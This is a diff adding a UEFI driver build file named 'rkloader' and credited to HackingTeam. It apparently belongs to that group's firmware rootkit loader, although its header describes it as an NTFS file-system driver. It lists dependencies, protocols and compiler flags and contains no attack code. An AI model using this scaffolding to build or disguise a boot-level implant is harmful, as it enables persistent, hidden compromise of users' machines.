@@ -1,0 +1,74 @@
+## @file
+#
+#  Binary NTFS EFI Driver for IA32, X64, IPF and EBC arch.
+#
+#  This UEFI driver detects the NTFS file system in the disk.
+#  It also produces the Simple File System protocol for the consumer to
+#  perform file and directory operations on the disk.
+#
+#  Copyright (c) 2012 - 2014, ]HackingTeam[. All rights reserved.<BR>
+#
+#
+##
+
+[Defines]
+  INF_VERSION                    = 0x00010005
+  BASE_NAME                      = rkloader
+  FILE_GUID                      = f50258a9-2f4d-4da9-861e-bda84d07a44c
+  MODULE_TYPE                    = UEFI_DRIVER
+  VERSION_STRING                 = 1.0
+
+  ENTRY_POINT                    = _ModuleEntryPoint
+
+#
+# The following information is for reference only and not required by the build tools.
+#
+  VALID_ARCHITECTURES           = IA32 X64
+#
+#  DRIVER_BINDING                =  gNtfsDriverBinding
+#  COMPONENT_NAME                =  gNtfsComponentName
+#  COMPONENT_NAME2               =  gNtfsComponentName2
+#
+
+[Sources]
+  # EFI_FILE_PROTOCOL Implementation
+  entry.c
+
+[Packages]
+  MdePkg/MdePkg.dec
+  MdeModulePkg/MdeModulePkg.dec
+  IntelFrameworkPkg/IntelFrameworkPkg.dec
+  IntelFrameworkModulePkg/IntelFrameworkModulePkg.dec
+  ShellPkg/ShellPkg.dec
+  
+[LibraryClasses]
+  UefiRuntimeServicesTableLib
+  UefiBootServicesTableLib
+  MemoryAllocationLib
+  BaseMemoryLib
+  BaseLib
+  UefiLib
+  DebugLib
+  PcdLib
+
+[Guids]
+  gEfiFileInfoGuid
+  gEfiFileSystemInfoGuid
+  gEfiFileSystemVolumeLabelInfoIdGuid
+
+[Protocols]
+  gEfiDiskIoProtocolGuid
+  gEfiBlockIoProtocolGuid
+  gEfiSimpleFileSystemProtocolGuid
+  gEfiUnicodeCollationProtocolGuid
+  gEfiUnicodeCollation2ProtocolGuid
+  gEfiSimpleFileSystemProtocolGuid
+  gEfiLoadedImageProtocolGuid
+
+[Pcd]
+  gEfiMdePkgTokenSpaceGuid.PcdUefiVariableDefaultLang
+  gEfiMdePkgTokenSpaceGuid.PcdUefiVariableDefaultPlatformLang
+
+[BuildOptions]
+  MSFT:*_*_IA32_CC_FLAGS == /nologo /wd4201 /W4 /Gy /c /D UEFI_BUILD /D HAVE_CONFIG_H /D UNICODE /Od /FIAutoGen.h /EHa-s-c- /GF /Gs8192 /Zi /Gm /GS- /Zp1
+  MSFT:*_*_X64_CC_FLAGS == /nologo /wd4201 /W4 /Gy /c /D UEFI_BUILD /D HAVE_CONFIG_H /D UNICODE /Od /FIAutoGen.h /EHa-s-c- /GF /Gs8192 /Zi /Gm /GS- 
